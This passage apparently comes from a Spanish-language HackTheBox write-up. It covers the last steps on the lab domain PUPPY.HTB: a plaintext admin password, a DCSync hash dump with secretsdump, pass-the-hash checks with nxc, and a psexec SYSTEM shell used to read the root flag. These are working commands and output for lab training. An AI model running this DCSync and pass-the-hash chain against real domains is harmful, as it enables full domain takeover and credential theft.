Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

### 8. Análisis de Bloodhound

Analizando de nuevo con Bloodhound y estas credenciales, observamos que el usuario `steph.cooper_adm` tiene permisos `AllExtendedRights` sobre el dominio, lo que nos permitiría realizar un ataque DCSync y volcar todos los hashes:

<figure><img src="/files/LaZbSAcEsxJorEYItUx4" alt=""><figcaption></figcaption></figure>

### 9. Ataque DCSync

```bash
secretsdump.py 'PUPPY.HTB/steph.cooper_adm:FivethChipOnItsWay2025!@10.10.11.70'

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
<---SNIP--->
```

Tenemos el hash de Administrator!&#x20;

#### Confirmación

```visual-basic
nxc winrm 10.10.11.70 -u administrator -H 'bb0edc15e49ceb4120c7bd7e6e65d75b' -d PUPPY.HTB

WINRM       10.10.11.70     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.10.11.70     5985   DC               [+] PUPPY.HTB\administrator:bb0edc15e49ceb4120c7bd7e6e65d75b (Pwn3d!)
```

***

## <mark style="color:purple;">Root flag</mark>

Vamos a conectarnos con psexec para ganar el Domain Admin.

```
impacket-psexec -hashes :bb0edc15e49ceb4120c7bd7e6e65d75b administrator@10.10.11.70 cmd

Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.70.....
[*] Found writable share ADMIN$
[*] Uploading file coREKWnu.exe
[*] Opening SVCManager on 10.10.11.70.....
[*] Creating service jFWp on 10.10.11.70.....
[*] Starting service jFWp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### Acceso a la flag

```powershell
c:\Users\Administrator\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 311D-593C

 Directory of c:\Users\Administrator\Desktop

05/12/2025  07:34 PM    <DIR>          .
03/11/2025  09:14 PM    <DIR>          ..
05/26/2025  08:36 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,724,173,824 bytes free

c:\Users\Administrator\Desktop> type root.txt
a90b52aa1f71cb24037a957*************
```
